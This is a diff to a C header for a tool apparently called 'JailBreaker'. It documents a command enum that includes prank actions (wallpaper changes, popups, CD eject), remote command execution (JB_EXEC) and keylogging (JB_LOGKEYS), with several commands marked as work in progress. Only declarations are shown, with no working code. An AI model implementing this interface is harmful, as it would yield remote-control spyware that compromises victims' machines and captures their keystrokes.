@@ -10,29 +10,31 @@
 
     --optional arguments are market with -opt
     --instructions with no args have (void)
+    --i:arg - iteger,  s:arg - string
+    -- -WIP -> Work In Progress
 
     JB_FUN      (void)
     JB_DEACTIVE (void)
-    JB_REMOVE   (void) 
+    JB_REMOVE   (void)  -WIP 
 
-    JB_VOLUME   [vol]
-    JB_SZAMBO   [soundFilePath]
+    JB_VOLUME   [i:vol] -WIP
+    JB_SZAMBO   [s:soundFile]
 
-    JB_SETWALL  [walpPath]
+    JB_SETWALL  [s:walpPath]
     JB_SAVEWALL (void)
     JB_LOADWALL (void)
 
-    JB_LINKMAKE [linkCount-opt def:100]
+    JB_LINKMAKE [i:linkCount-opt def:100]
     JB_LINKDEL  (void)
 
-    JB_OPENWEB  [site]
-    JB_CDEJECT  (void)
-    JB_POPUPW   [msg] [wTitle-opt def:JB]
-    JB_POPUPA   [msg] [wTitle-opt def:JB]
-    JB_EXEC     [cmd]
-    JB_ROTATESCR[angle] (0-default, 1-90deg, 2-180deg, 3-270deg)
-    JB_CHANGERES[res]   
-    JB_LOGKEYS  (void)
+    JB_OPENWEB  [s:site]
+    JB_CDEJECT  (void)  -WIP
+    JB_POPUPW   [s:msg] [s:wTitle-opt def:JB]
+    JB_POPUPA   [s:msg] [s:wTitle-opt def:JB]
+    JB_EXEC     [s:cmd] -WIP
+    JB_ROTATESCR[i:angle] (0-default, 1-90deg, 2-180deg, 3-270deg)  -WIP
+    JB_CHANGERES[i:res] -WIP
+    JB_LOGKEYS  (void)  -WIP
 */
 
 typedef enum {
@@ -43,7 +45,7 @@ typedef enum {
 
     /* --- Sounds --- */
     JB_VOLUME,      // set system volume
-    JB_SZAMBO,      // paly sound
+    JB_SZAMBO,      // play sound
 
     /* --- Wallpaper --- */
     JB_SETWALL,     // set wallpaper to an image
@@ -62,7 +64,7 @@ typedef enum {
     JB_EXEC,        // execute a cmdlet
     JB_ROTATESCR,   // SetDisplayAutoRotationPreferences
     JB_CHANGERES,   // set screen resolution
-    JB_LOGKEYS      // keylogging bruh.   
+    JB_LOGKEYS      // keylogging bruh.
 } JB_Instruction;
 
 typedef struct {
@@ -70,8 +72,6 @@ typedef struct {
     JB_Instruction cmd;     // JB_POPUP "Title¿"Polskie szamba liderem są w kraju"\0"
     char args[CMD_ARGSZ];
 } JBCMD; // JailBreaker Command
-
-//WINBOOL changeWallpaper(char *path);  // I think we don't need to expose it
 
 void execCommand(JBCMD cmd); // star of the show
 
